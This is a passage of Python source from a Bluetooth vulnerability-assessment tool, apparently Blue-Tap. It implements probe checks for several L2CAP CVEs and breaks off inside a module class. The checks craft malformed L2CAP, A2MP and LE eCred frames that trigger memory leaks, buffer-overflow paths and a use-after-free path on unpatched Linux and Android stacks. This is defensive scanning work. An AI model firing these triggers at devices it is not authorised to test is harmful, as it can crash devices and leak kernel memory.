"""CVE detection checks for L2CAP (Logical Link Control and Adaptation Protocol).

Checks implemented:
  - CVE-2019-3459: Linux kernel L2CAP configuration MTU info leak via
    malformed CONF_REQ with MTU option len=0 and response-value jitter.
  - CVE-2018-9359/9360/9361: Android L2CAP heap memory disclosure via malformed
    CMD_CONN_REQ (truncated, missing SCID field) — heap jitter across 3 probes.
  - CVE-2020-12352: BlueZ A2MP heap information disclosure (BadChoice) via
    A2MP GET_INFO_REQ with invalid ctrl_id on fixed CID 0x0003.
  - CVE-2022-42896: Linux kernel LE credit-based connect with PSM=0 should be
    rejected with LE_PSM_NOT_SUPPORTED; disconnect/timeout is the vulnerable path.
  - CVE-2022-20345: Android BLE L2CAP eCred buffer overflow via
    CREDIT_BASED_CONN_REQ with 6 source CIDs (spec max=5).
  - CVE-2026-23395: L2CAP eCred duplicate identifier overflow via two
    L2CAP_ECRED_CONN_REQ with identical Identifier bytes.
  - CVE-2022-42895: L2CAP EFS option kernel pointer leak via CONF_REQ that
    does not include EFS option but receives EFS in CONF_RSP.

Each check function returns a list[dict] of findings. An empty list means either
not applicable or the target appears patched.
"""

from __future__ import annotations

import ctypes
import ctypes.util
import socket
import struct
import time

from blue_tap.modules.assessment.cve_framework import make_cve_finding as _finding

AF_BLUETOOTH = 31
BTPROTO_L2CAP = 0

# ---------------------------------------------------------------------------
# ctypes helper for BLE fixed-channel connections
# ---------------------------------------------------------------------------
# Python's socket.connect() only accepts (bdaddr, psm) tuples for AF_BLUETOOTH.
# To reach BLE fixed channels (LE-sig CID=0x0005, SMP CID=0x0006, ATT CID=0x0004)
# we must call libc connect() directly with struct sockaddr_l2 setting l2_cid.

try:
    _libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
except Exception:
    _libc = None


class _BdAddrBytes(ctypes.Structure):
    _fields_ = [("b", ctypes.c_uint8 * 6)]


class _SockAddrL2(ctypes.Structure):
    _fields_ = [
        ("l2_family",      ctypes.c_uint16),
        ("l2_psm",         ctypes.c_uint16),
        ("l2_bdaddr",      _BdAddrBytes),
        ("l2_cid",         ctypes.c_uint16),
        ("l2_bdaddr_type", ctypes.c_uint8),
    ]


_BDADDR_LE_PUBLIC = 1


def _connect_ble_fixed_channel(address: str, cid: int,
                                timeout: float = 5.0) -> "socket.socket | None":
    """Open a SEQPACKET socket connected to a BLE fixed channel CID.

    Uses ctypes to call libc connect() with struct sockaddr_l2, setting l2_cid
    directly (l2_psm=0).  With this approach recv/send operate on the raw
    channel payload — no L2CAP header is present in the data.

    Returns the connected socket, or None on any failure.
    """
    if _libc is None:
        return None
    sock = None
    try:
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        sock.settimeout(timeout)

        sa = _SockAddrL2()
        sa.l2_family = AF_BLUETOOTH
        sa.l2_psm = 0  # PSM=0 → use CID
        # BD_ADDR bytes are stored little-endian in struct sockaddr_l2
        parts = [int(x, 16) for x in address.split(":")]
        for i, byte_val in enumerate(reversed(parts)):
            sa.l2_bdaddr.b[i] = byte_val
        sa.l2_cid = cid
        sa.l2_bdaddr_type = _BDADDR_LE_PUBLIC

        ret = _libc.connect(sock.fileno(), ctypes.byref(sa), ctypes.sizeof(sa))
        if ret != 0:
            sock.close()
            return None
        return sock
    except Exception:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        return None
# ---------------------------------------------------------------------------
# Check 1: CVE-2019-3459 — Linux L2CAP CONF_REQ MTU Pointer Leak
# ---------------------------------------------------------------------------

def _check_l2cap_conf_mtu_info_leak(address: str) -> list[dict]:
    """Send malformed L2CAP_CONF_REQ with MTU option len=0 three times.

    Patched kernels ignore the malformed MTU option and return a consistent
    default MTU value (typically 672) or omit the option entirely. Vulnerable
    kernels reflect the low 16 bits of a heap pointer, causing the returned MTU
    value to vary across probes.
    """
    mtu_samples: list[int] = []

    for probe_n in range(3):
        sock = None
        try:
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_L2CAP)
            sock.settimeout(5.0)
            sock.connect((address, 0))

            req_ident = probe_n + 1
            resp_ident = 0x40 + probe_n
            local_scid = 0x4040 + probe_n

            conn_data = struct.pack("<HH", 0x0001, local_scid)
            conn_sig = struct.pack("<BBH", 0x02, req_ident, len(conn_data)) + conn_data
            sock.sendall(struct.pack("<HH", len(conn_sig), 0x0001) + conn_sig)

            remote_dcid = None
            for _ in range(4):
                resp = sock.recv(256)
                if len(resp) < 16 or struct.unpack_from("<H", resp, 2)[0] != 0x0001:
                    continue
                if resp[4] != 0x03 or resp[5] != req_ident:
                    continue
                result = struct.unpack_from("<H", resp, 12)[0]
                if result != 0x0000:
                    remote_dcid = -1
                    break
                remote_dcid = struct.unpack_from("<H", resp, 8)[0]
                break

            if remote_dcid is None:
                continue
            if remote_dcid < 0:
                return [_finding(
                    "INFO", "CVE-2019-3459: Not Applicable",
                    "Linux L2CAP configuration info-leak probe skipped — target refused the "
                    "baseline L2CAP connection to PSM 1 needed to reach the config path.",
                    cve="CVE-2019-3459", status="not_applicable", confidence="high",
                    evidence="L2CAP connection request to PSM 0x0001 was rejected",
                )]

            conf_opts = bytes([0x01, 0x00])
            conf_data = struct.pack("<HH", remote_dcid, 0x0000) + conf_opts
            conf_sig = struct.pack("<BBH", 0x04, resp_ident, len(conf_data)) + conf_data
            sock.sendall(struct.pack("<HH", len(conf_sig), 0x0001) + conf_sig)

            for _ in range(4):
                resp = sock.recv(256)
                if len(resp) < 14 or struct.unpack_from("<H", resp, 2)[0] != 0x0001:
                    continue
                if resp[4] != 0x05 or resp[5] != resp_ident:
                    continue
                options = resp[14:]
                idx = 0
                while idx + 2 <= len(options):
                    opt_type = options[idx] & 0x7F
                    opt_len = options[idx + 1]
                    opt_end = idx + 2 + opt_len
                    if opt_end > len(options):
                        break
                    if opt_type == 0x01 and opt_len == 2:
                        mtu_samples.append(struct.unpack_from("<H", options, idx + 2)[0])
                        break
                    idx = opt_end
                break
        except OSError:
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        time.sleep(0.1)

    if not mtu_samples:
        return [_finding(
            "INFO", "CVE-2019-3459: Not Applicable",
            "Linux L2CAP configuration info-leak probe skipped — no usable CONF_RSP frames "
            "were captured after the malformed MTU requests.",
            cve="CVE-2019-3459", status="not_applicable", confidence="high",
            evidence="No parseable CONF_RSP carrying an MTU option",
        )]
    if len(mtu_samples) < 2:
        return [_finding(
            "MEDIUM", "CVE-2019-3459: Inconclusive",
            "Malformed L2CAP MTU-option probe reached the target, but too few configuration "
            "responses were captured to evaluate response jitter.",
            cve="CVE-2019-3459", status="inconclusive", confidence="medium",
            evidence=f"Observed MTU sample(s): {[hex(v) for v in mtu_samples]}",
        )]
    if len(set(mtu_samples)) > 1:
        return [_finding(
            "HIGH",
            "Linux L2CAP Configuration MTU Info Leak (CVE-2019-3459)",
            "Malformed L2CAP configuration requests with MTU option len=0 produced varying "
            "MTU values across repeated probes, matching the vulnerable heap-pointer jitter.",
            cve="CVE-2019-3459",
            impact="Kernel heap address disclosure via L2CAP configuration responses",
            remediation="Update the Linux kernel to a build containing the L2CAP option-length checks.",
            status="confirmed",
            confidence="high",
            evidence=f"Returned MTU values across probes: {[hex(v) for v in mtu_samples]}",
        )]
    if mtu_samples[0] != 672:
        return [_finding(
            "MEDIUM", "CVE-2019-3459: Inconclusive",
            "The malformed L2CAP MTU probe returned a stable non-default value. That is not "
            "the documented patched result, but it also did not exhibit the vulnerable jitter.",
            cve="CVE-2019-3459", status="inconclusive", confidence="medium",
            evidence=f"Stable MTU value across probes: 0x{mtu_samples[0]:04X}",
        )]
    return []


# ---------------------------------------------------------------------------
# Check 2: CVE-2018-9359/9360/9361 — Android L2CAP Heap Jitter
# ---------------------------------------------------------------------------

def _check_android_l2cap_heap_jitter(address: str) -> list[dict]:
    """Send malformed L2CAP CMD_CONN_REQ (truncated, missing SCID) 3 times.

    If SCID values in CMD_CONN_RSP vary across probes, the device is leaking
    OOB heap memory in process_l2cap_cmd(), confirming CVE-2018-9359/9360/9361.
    """
    scids = []
    for probe_n in range(3):
        sock = None
        try:
            # SOCK_RAW is required to inject L2CAP frames directly to signaling CID 0x0001.
            # With SOCK_SEQPACKET the kernel treats our data as application payload and
            # routes it through an existing channel, never reaching the signaling handler.
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_L2CAP)
            sock.settimeout(5.0)
            sock.connect((address, 0))  # address-only bind for raw L2CAP

            # L2CAP signaling B-frame to CID 0x0001:
            # L2CAP header: length(2 LE) + CID(2 LE) = 0x0001
            # Signaling: code(1) + id(1) + sig_len(2 LE) + data
            # CMD_CONN_REQ (0x02) with sig_len=2 (only PSM, missing SCID = malformed)
            sig_data = struct.pack("<H", 0x0001)  # PSM=SDP, no SCID (truncated)
            sig_cmd = struct.pack("<BBH", 0x02, probe_n + 1, len(sig_data)) + sig_data
            l2cap_frame = struct.pack("<HH", len(sig_cmd), 0x0001) + sig_cmd  # CID=signaling

            sock.sendall(l2cap_frame)
            resp = sock.recv(256)

            # Parse response: L2CAP header(4) + signaling header(4) + data
            # CMD_CONN_RSP (0x03): PSM(2) + SCID(2) + DCID(2) + result(2) + status(2)
            # or CMD_REJECT (0x01)
            if len(resp) >= 10:
                sig_code = resp[4]  # signaling command code
                if sig_code == 0x03:  # CMD_CONN_RSP
                    scid = struct.unpack_from("<H", resp, 8)[0]  # SCID at offset 8
                    scids.append(scid)
                elif sig_code == 0x01:  # CMD_REJECT
                    scids.append(0)  # rejected = consistent
        except OSError:
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        time.sleep(0.1)

    if not scids:
        return [_finding(
            "INFO", "CVE-2018-9359/60/61: Not Applicable",
            "Android L2CAP heap-jitter probe skipped — target did not respond on Classic "
            "L2CAP signaling in a way that exposed the vulnerable path.",
            cve="CVE-2018-9359,CVE-2018-9360,CVE-2018-9361",
            status="not_applicable", confidence="high",
            evidence="No L2CAP signaling response to malformed CMD_CONN_REQ probes",
        )]
    if len(scids) < 2:
        return [_finding(
            "MEDIUM", "CVE-2018-9359/60/61: Inconclusive",
            "Malformed L2CAP signaling probe reached the target, but too few responses were "
            "captured to evaluate heap-value jitter reliably.",
            cve="CVE-2018-9359,CVE-2018-9360,CVE-2018-9361",
            status="inconclusive", confidence="medium",
            evidence=f"Observed SCID samples: {[hex(s) for s in scids]}",
        )]

    # Jitter check: non-zero SCID values that vary = heap memory
    non_zero = [s for s in scids if s != 0]
    if len(non_zero) >= 2 and len(set(non_zero)) > 1:
        return [_finding("HIGH",
            "Android L2CAP Heap Memory Disclosure (CVE-2018-9359/9360/9361)",
            "Malformed L2CAP CMD_CONN_REQ (truncated, missing SCID) returned varying "
            "SCID values across 3 probes, indicating OOB heap read in process_l2cap_cmd().",
            cve="CVE-2018-9359,CVE-2018-9360,CVE-2018-9361",
            impact="Heap address/data disclosure — defeats ASLR, aids further exploitation",
            remediation="Apply Android Security Bulletin 2018-04-01 patch (commit b66fc164)",
            status="confirmed", confidence="high",
            evidence=f"SCID values across 3 probes: {[hex(s) for s in scids]} — vary = OOB read")]
    return []


# ---------------------------------------------------------------------------
# Check 3: CVE-2020-12352 — A2MP GETINFO_REQ Heap Jitter (BadChoice)
# ---------------------------------------------------------------------------

def _check_a2mp_heap_jitter(address: str) -> list[dict]:
    """Send A2MP GET_INFO_REQ with invalid ctrl_id=0x42 to fixed CID 0x0003.

    Unpatched kernels return garbage heap bytes in the info_data field.
    Patched kernels return all-zero data or a proper error (CVE-2020-12352 / BadChoice).
    """
    info_samples = []

    for probe_n in range(3):
        sock = None
        try:
            # Raw L2CAP socket for fixed channel access
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_L2CAP)
            sock.settimeout(3.0)
            sock.connect((address, 0))  # address-only bind for raw L2CAP

            # A2MP GET_INFO_REQ: code=0x06, ident=probe_n+1, len=1, ctrl_id=0x42
            a2mp_hdr = struct.pack("<BBH", 0x06, probe_n + 1, 1)
            a2mp_data = bytes([0x42])  # ctrl_id (invalid)
            # L2CAP B-frame: length(2 LE) + CID(2 LE) = 0x0003 (A2MP)
            payload = a2mp_hdr + a2mp_data
            frame = struct.pack("<HH", len(payload), 0x0003) + payload

            sock.sendall(frame)
            resp = sock.recv(256)

            # A2MP GET_INFO_RSP: code=0x07, ident, len, ctrl_id(1), result(1), info_data(N)
            # L2CAP header is 4 bytes, then A2MP header is 4 bytes, then payload
            if len(resp) >= 12:
                # Leak region begins after ctrl_id + status; capture the 14-byte
                # uninitialized struct tail documented in the spec when available.
                info_data = resp[10:24]
                info_samples.append(info_data)
        except OSError:
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
        time.sleep(0.1)

    if not info_samples:
        return [_finding(
            "INFO", "CVE-2020-12352: Not Applicable",
            "A2MP BadChoice check skipped — target did not respond on fixed channel CID 0x0003. "
            "This usually means A2MP is disabled or absent.",
            cve="CVE-2020-12352", status="not_applicable", confidence="high",
            evidence="No response on A2MP fixed CID 0x0003",
        )]
    if len(info_samples) < 2:
        return [_finding(
            "MEDIUM", "CVE-2020-12352: Inconclusive",
            "A2MP probe reached the target, but too few responses were captured to judge "
            "whether the uninitialized response region is stable or jittery.",
            cve="CVE-2020-12352", status="inconclusive", confidence="medium",
            evidence=f"Captured {len(info_samples)} A2MP response sample(s)",
        )]

    # Jitter: any non-zero byte that differs between sample 0 and sample 2
    all_zero = all(all(b == 0 for b in s) for s in info_samples)
    if all_zero:
        return []  # PATCHED — returns zeros

    varies = any(
        info_samples[0][i] != info_samples[-1][i]
        for i in range(min(len(info_samples[0]), len(info_samples[-1])))
    )
    if varies or any(b != 0 for s in info_samples for b in s):
        return [_finding("HIGH",
            "BlueZ A2MP Heap Information Disclosure (CVE-2020-12352 / BadChoice)",
            "A2MP GET_INFO_REQ with invalid ctrl_id=0x42 returned non-zero info_data bytes. "
            "Patched kernels return result=NOT_YET_KNOWN with zero data.",
            cve="CVE-2020-12352",
            impact="Stack memory disclosure — may leak kernel pointers, defeating KASLR",
            remediation="Update Linux kernel >= 5.10 (patch in commit 5c4c8c954409)",
            status="confirmed", confidence="high",
            evidence=f"A2MP info_data across 3 probes: {[s.hex() for s in info_samples]}")]
    return []


# ---------------------------------------------------------------------------
# Check 4: CVE-2022-42896 — Linux LE Credit-Based PSM=0 UAF Differential
# ---------------------------------------------------------------------------

def _check_l2cap_psm_zero_uaf(address: str) -> list[dict]:
    """Send LE Credit-Based Connection Request with SPSM=0x0000.

    Patched kernels reject PSM=0 before channel lookup and respond with
    LE_PSM_NOT_SUPPORTED. Vulnerable kernels may disconnect or time out.
    """
    sock = _connect_ble_fixed_channel(address, cid=0x0005, timeout=5.0)
    if sock is None:
        return [_finding(
            "INFO", "CVE-2022-42896: Not Applicable",
            "PSM=0 compliance probe skipped — Blue-Tap could not reach the LE signaling "
            "fixed channel on this target.",
            cve="CVE-2022-42896", status="not_applicable", confidence="high",
            evidence="LE signaling fixed channel CID 0x0005 was not reachable",
        )]

    try:
        req = struct.pack("<BBH", 0x14, 0x21, 10) + struct.pack("<HHHHH", 0x0000, 0x0200, 0x0200, 0x0064, 0x0040)
        sock.sendall(req)
        resp = sock.recv(256)
        if not resp:
            return [_finding(
                "MEDIUM", "CVE-2022-42896: Inconclusive",
                "The PSM=0 probe did not receive a response, but absence of a reply alone is not "
                "a reliable CVE-2022-42896 differential without an observed disconnect or other "
                "abnormal LE signaling behavior.",
                cve="CVE-2022-42896", status="inconclusive", confidence="medium",
                evidence="No response to LE credit-based connect request with SPSM=0x0000",
            )]
        if resp[0] == 0x15 and len(resp) >= 14:
            result_code = struct.unpack_from("<H", resp, 12)[0]
            if result_code == 0x0002:
                return []
            return [_finding(
                "MEDIUM", "CVE-2022-42896: Inconclusive",
                "The target replied to PSM=0, but not with the documented LE_PSM_NOT_SUPPORTED "
                "result required by the patched path.",
                cve="CVE-2022-42896", status="inconclusive", confidence="medium",
                evidence=f"LE credit-based response result=0x{result_code:04X}",
            )]
        if resp[0] == 0x01:
            return []
        return [_finding(
            "MEDIUM", "CVE-2022-42896: Inconclusive",
            "The target returned an unexpected LE signaling frame to the PSM=0 compliance probe.",
            cve="CVE-2022-42896", status="inconclusive", confidence="medium",
            evidence=f"Unexpected opcode 0x{resp[0]:02X}",
        )]
    except OSError as exc:
        return [_finding(
            "HIGH",
            "Linux L2CAP LE PSM=0 Handling Failure (CVE-2022-42896)",
            "The LE signaling channel dropped during the PSM=0 compliance probe instead of "
            "returning a normal bad-PSM response.",
            cve="CVE-2022-42896",
            impact="Pre-auth kernel UAF path reachable from LE credit-based connect setup",
            remediation="Update the kernel to reject LE credit-based PSM=0 before channel lookup.",
            status="confirmed",
            confidence="medium",
            evidence=str(exc),
        )]
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# Check 5: CVE-2022-20345 — Android BLE L2CAP eCred 6-CID Overflow
# ---------------------------------------------------------------------------

def _check_ecred_6cid_overflow(address: str) -> list[dict]:
    """Send BLE L2CAP CREDIT_BASED_CONN_REQ with 6 source CIDs (spec max=5).

    Patched stacks return INVALID_PARAMS (0x0005) for all; unpatched stacks
    process the overflow, triggering a buffer overflow in l2c_ble.cc
    (CVE-2022-20345, Android 12).
    """
    # Connect to BLE LE signaling fixed channel (CID 0x0005) via ctypes sockaddr_l2.
    # SOCK_SEQPACKET + PSM approach cannot reach BLE fixed channels from Linux.
    sock2 = _connect_ble_fixed_channel(address, cid=0x0005, timeout=5.0)
    if sock2 is None:
        return [_finding(
            "INFO", "CVE-2022-20345: Not Applicable",
            "eCred channel-count probe skipped — Blue-Tap could not reach the LE signaling "
            "fixed channel on this target.",
            cve="CVE-2022-20345", status="not_applicable", confidence="high",
            evidence="LE signaling fixed channel CID 0x0005 was not reachable",
        )]

    try:
        # L2CAP_CREDIT_BASED_CONN_REQ: signal code 0x17
        # SPSM(2) + MTU(2) + MPS(2) + InitCredits(2) + 6×SCID(2) = 18 bytes
        signal_data = struct.pack("<HHHH", 0xFFFF, 64, 64, 1)  # SPSM, MTU, MPS, Credits
        for i in range(6):  # 6 CIDs (max=5 per spec)
            signal_data += struct.pack("<H", 0x0040 + i)
        # With ctypes CID approach, send signal PDU directly (no L2CAP frame header)
        signal = struct.pack("<BBH", 0x17, 0x01, len(signal_data)) + signal_data

        sock2.sendall(signal)
        sock2.settimeout(3.0)
        resp = sock2.recv(256)

        # Parse L2CAP_CREDIT_BASED_CONN_RSP (0x18)
        # Payload layout (ctypes, no L2CAP header): code(1)+id(1)+len(2)+MTU(2)+MPS(2)+Credits(2)+result(2)+DCIDs
        if len(resp) >= 12:
            sig_code = resp[0]  # signal code at byte 0 (no L2CAP header in payload)
            if sig_code == 0x01:
                return []
            if sig_code == 0x18:
                result_code = struct.unpack_from("<H", resp, 10)[0]  # offset: 4(hdr)+6(MTU+MPS+Credits)
                if result_code in {0x0003, 0x0004, 0x0005, 0x0007}:
                    return []  # PATCHED
                return [_finding("CRITICAL",
                    "Android BLE L2CAP eCred Buffer Overflow (CVE-2022-20345)",
                    "L2CAP CREDIT_BASED_CONN_REQ with 6 source CIDs (spec max=5) was not "
                    "rejected with INVALID_PARAMS. Buffer overflow in l2c_ble.cc.",
                    cve="CVE-2022-20345",
                    impact="Remote code execution via Bluetooth on Android 12",
                    remediation="Apply Android Security Bulletin 2022-07-01",
                    status="confirmed", confidence="high",
                    evidence=(f"eCred request with 6 CIDs returned "
                              f"result_code=0x{result_code:04X} (not INVALID_PARAMS=0x0005)"))]
        return [_finding(
            "MEDIUM", "CVE-2022-20345: Inconclusive",
            "Target accepted the BLE signaling connection, but the reply to the 6-channel "
            "eCred request was too short or semantically unclear to classify.",
            cve="CVE-2022-20345", status="inconclusive", confidence="medium",
            evidence=f"Unexpected response length/code from eCred probe: {resp.hex()[:48]}",
        )]
    except OSError as exc:
        return [_finding(
            "MEDIUM", "CVE-2022-20345: Inconclusive",
            "eCred overflow probe did not complete cleanly after reaching the LE signaling path.",
            cve="CVE-2022-20345", status="inconclusive", confidence="medium",
            evidence=str(exc),
        )]
    finally:
        sock2.close()


# ---------------------------------------------------------------------------
# Check 6: CVE-2026-23395 — L2CAP eCred Duplicate Identifier
# ---------------------------------------------------------------------------

def _check_ecred_duplicate_id(address: str) -> list[dict]:
    """Send two L2CAP_ECRED_CONN_REQ with identical Identifier bytes.

    Patched stacks reject the duplicate with INVALID_PARAMS. Unpatched stacks
    process both requests, triggering a buffer overflow in enhanced
    credit-based flow control (CVE-2026-23395).
    """
    # Connect to BLE LE signaling fixed channel (CID 0x0005) via ctypes sockaddr_l2.
    sock = _connect_ble_fixed_channel(address, cid=0x0005, timeout=5.0)
    if sock is None:
        return [_finding(
            "INFO", "CVE-2026-23395: Not Applicable",
            "Duplicate-Identifier eCred check skipped — Blue-Tap could not reach the LE "
            "signaling fixed channel on this target.",
            cve="CVE-2026-23395", status="not_applicable", confidence="high",
            evidence="LE signaling fixed channel CID 0x0005 was not reachable",
        )]

    def _ecred_req(identifier: int, spsm: int = 0xFFFF) -> bytes:
        data = struct.pack("<HHHH", spsm, 64, 64, 1)
        data += struct.pack("<HH", 0x0041, 0x0042)  # 2 SCIDs
        # Send signal PDU directly (no L2CAP frame header — ctypes CID approach)
        return struct.pack("<BBH", 0x17, identifier, len(data)) + data

    try:
        # Send two requests with SAME identifier (0x01 both times)
        sock.sendall(_ecred_req(identifier=0x01))
        time.sleep(0.05)
        sock.sendall(_ecred_req(identifier=0x01))

        responses = []
        for _ in range(2):
            try:
                sock.settimeout(2.0)
                r = sock.recv(256)
                if r:
                    responses.append(r)
            except (TimeoutError, OSError):
                break

        if not responses:
            return [_finding(
                "INFO", "CVE-2026-23395: Not Applicable",
                "Duplicate-Identifier eCred check skipped — target did not respond on the LE "
                "signaling path needed for ECFC.",
                cve="CVE-2026-23395", status="not_applicable", confidence="high",
                evidence="No LE signaling response to ECFC duplicate-identifier probe",
            )]

        if len(responses) == 1:
            return [_finding(
                "MEDIUM",
                "Duplicate-Identifier ECFC Handling Ambiguous (CVE-2026-23395)",
                "The duplicate-Identifier ECFC probe received only one response, which is not a clean patched reject path.",
                cve="CVE-2026-23395",
                status="inconclusive",
                confidence="medium",
                evidence=f"Only one ECFC response observed after duplicate identifier reuse (opcode=0x{responses[0][0]:02X})",
            )]

        second = responses[1]
        if len(second) >= 12 and second[0] == 0x18:
            result_code = struct.unpack_from("<H", second, 10)[0]
            if result_code == 0x0007:
                return []
            if result_code not in {0x0003, 0x0004, 0x0005, 0x0007}:
                return [_finding("HIGH",
                    "L2CAP eCred Duplicate Identifier Overflow (CVE-2026-23395)",
                    "The second ECFC request reused an identical Identifier and was still "
                    "processed instead of being rejected as invalid.",
                    cve="CVE-2026-23395",
                    impact="Buffer overflow in enhanced credit-based flow control",
                    remediation="Update the target kernel to a build that rejects duplicate ECFC Identifiers.",
                    status="confirmed", confidence="high",
                    evidence=f"Second duplicate request returned result_code=0x{result_code:04X}")]

        return [_finding(
            "MEDIUM", "CVE-2026-23395: Inconclusive",
            "Duplicate-Identifier ECFC probe reached the target, but the second response did "
            "not cleanly match either the patched reject path or the documented vulnerable path.",
            cve="CVE-2026-23395", status="inconclusive", confidence="medium",
            evidence=f"Observed {len(responses)} response(s); second={second.hex()[:48]}",
        )]
    except OSError as exc:
        return [_finding(
            "MEDIUM", "CVE-2026-23395: Inconclusive",
            "Duplicate-Identifier ECFC probe did not complete cleanly.",
            cve="CVE-2026-23395", status="inconclusive", confidence="medium",
            evidence=str(exc),
        )]
    finally:
        sock.close()


# ---------------------------------------------------------------------------
# Check 7: CVE-2022-42895 — L2CAP EFS Info Leak
# ---------------------------------------------------------------------------

def _check_l2cap_efs_info_leak(address: str) -> list[dict]:
    """Send L2CAP_CONF_REQ with ERTM option but no EFS option.

    If CONF_RSP contains EFS option (type=0x08) with non-zero bytes, the kernel
    is leaking uninitialised EFS struct padding bytes containing kernel memory
    (CVE-2022-42895).
    """
    efs_samples = []
    for probe_n in range(3):
        try:
            # SOCK_RAW required to inject L2CAP signaling frames to CID 0x0001.
            sock = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_L2CAP)
            sock.settimeout(5.0)
            sock.connect((address, 0))  # address-only bind for raw L2CAP

            # L2CAP_CONF_REQ: code=0x04
            # Options: ERTM mode option only (type=0x04, len=9)
            # No EFS option (type=0x08) — patched kernel won't add it; unpatched will
            ertm_option = bytes([0x04, 0x09, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
            # We need the actual DCID from the connection — use CID 0x0040 (first dynamic CID)
            conf_data = struct.pack("<HH", 0x0040, 0x0000) + ertm_option  # dcid + flags + options
            sig_cmd = struct.pack("<BBH", 0x04, probe_n + 1, len(conf_data)) + conf_data
            frame = struct.pack("<HH", len(sig_cmd), 0x0001) + sig_cmd

            sock.sendall(frame)
            resp = sock.recv(256)
            sock.close()

            # Look for EFS option (type=0x08) in response options
            # L2CAP_CONF_RSP: code=0x05, id, len, scid(2), flags(2), options...
            # Options start at offset 4(L2CAP) + 8(signal header + scid/flags) = 12
            if len(resp) > 12:
                options = resp[12:]
                efs_found = False
                i = 0
                while i < len(options) - 1:
                    opt_type = options[i] & 0x7F
                    opt_len = options[i + 1] if i + 1 < len(options) else 0
                    if opt_type == 0x08 and opt_len >= 8:
                        efs_data = options[i + 2:i + 2 + opt_len]
                        efs_samples.append(efs_data)
                        efs_found = True
                        break
                    i += 2 + opt_len
                if not efs_found:
                    efs_samples.append(bytes(8))  # all-zero placeholder = no EFS
        except OSError:
            pass
        time.sleep(0.1)

    if len(efs_samples) < 2:
        return []

    # If EFS option present with non-zero bytes in any sample → kernel leaked something
    non_trivial = [s for s in efs_samples if any(b != 0 for b in s)]
    if non_trivial:
        return [_finding("HIGH",
            "L2CAP EFS Option Kernel Pointer Leak (CVE-2022-42895)",
            "L2CAP CONF_RSP contains EFS option (type=0x08) with non-zero bytes in response "
            "to a CONF_REQ that did NOT include EFS. Unpatched kernel copies EFS struct with "
            "uninitialised padding bytes containing kernel memory.",
            cve="CVE-2022-42895",
            impact="Kernel memory disclosure — may leak kernel pointers, defeating KASLR",
            remediation="Update Linux kernel >= 6.1 (patch in commit b1a2cd50c0357)",
            status="confirmed", confidence="high",
            evidence=f"EFS option data across probes: {[s.hex() for s in efs_samples[:2]]}")]
    return []


# ---------------------------------------------------------------------------
# Native Module classes
# ---------------------------------------------------------------------------

from typing import Any

from blue_tap.framework.module import Module, RunContext
from blue_tap.framework.module.options import OptAddress
from blue_tap.modules.assessment.base import CveCheckModule


class Cve20193459Module(CveCheckModule):
    """CVE-2019-3459: Linux L2CAP CONF_REQ MTU pointer leak."""

    module_id = "assessment.cve_2019_3459"
    name = "L2CAP CONF MTU Info Leak"
    description = "CVE-2019-3459: L2CAP CONF_REQ MTU len=0 leaks kernel heap pointer bits"
    protocols = ("Classic", "L2CAP")
    requires = ("classic_target",)
    destructive = False
    references = ("CVE-2019-3459",)
    options = (OptAddress("RHOST", required=True, description="Target BR/EDR address"),)

    check_fn = staticmethod(_check_l2cap_conf_mtu_info_leak)
    option_param_map = {"RHOST": "address"}


class Cve20189359Module(CveCheckModule):
    """CVE-2018-9359: Android L2CAP heap memory disclosure."""

    module_id = "assessment.cve_2018_9359"
    name = "Android L2CAP Heap Jitter"
    description = "CVE-2018-9359/9360/9361: L2CAP CMD_CONN_REQ heap disclosure on Android"
    protocols = ("Classic", "L2CAP")
    requires = ("classic_target",)
    destructive = False
    references = ("CVE-2018-9359", "CVE-2018-9360", "CVE-2018-9361")
    options = (OptAddress("RHOST", required=True, description="Target BR/EDR address"),)

    check_fn = staticmethod(_check_android_l2cap_heap_jitter)
    option_param_map = {"RHOST": "address"}


class Cve202012352Module(CveCheckModule):
    """CVE-2020-12352: BlueZ A2MP heap information disclosure (BadChoice)."""

    module_id = "assessment.cve_2020_12352"
    name = "BlueZ A2MP Heap Jitter"
    description = "CVE-2020-12352 BadChoice: BlueZ A2MP heap info leak (invalid ctrl_id)"
    protocols = ("Classic", "L2CAP", "A2MP")
    requires = ("classic_target",)
    destructive = False
    references = ("CVE-2020-12352",)
    options = (OptAddress("RHOST", required=True, description="Target BR/EDR address"),)

    check_fn = staticmethod(_check_a2mp_heap_jitter)
    option_param_map = {"RHOST": "address"}


class Cve202242896Module(CveCheckModule):
    """CVE-2022-42896: Linux LE credit-based connect PSM=0 UAF."""

    module_id = "assessment.cve_2022_42896"
    name = "LE Credit PSM Zero UAF"
    description = "CVE-2022-42896: Linux LE credit-based connect PSM=0 use-after-free"
    protocols = ("BLE", "L2CAP")
    requires = ("ble_target",)
    destructive = False
    references = ("CVE-2022-42896",)
    options = (OptAddress("RHOST", required=True, description="Target BLE address"),)

    check_fn = staticmethod(_check_l2cap_psm_zero_uaf)
    option_param_map = {"RHOST": "address"}


class Cve202220345Module(CveCheckModule):
    """CVE-2022-20345: Android BLE L2CAP eCred 6-CID overflow."""

    module_id = "assessment.cve_2022_20345"
    name = "eCred 6-CID Overflow"
    description = "CVE-2022-20345: Android BLE L2CAP eCred overflow via 6-CID CONN_REQ"
    protocols = ("BLE", "L2CAP")
    requires = ("ble_target",)
    destructive = False
    references = ("CVE-2022-20345",)
    options = (OptAddress("RHOST", required=True, description="Target BLE address"),)

    check_fn = staticmethod(_check_ecred_6cid_overflow)
    option_param_map = {"RHOST": "address"}


class Cve202623395Module(CveCheckModule):
    """CVE-2026-23395: L2CAP eCred duplicate identifier overflow."""

    module_id = "assessment.cve_2026_23395"
    name = "eCred Duplicate Identifier"
    description = "CVE-2026-23395: L2CAP eCred duplicate Identifier overflow"
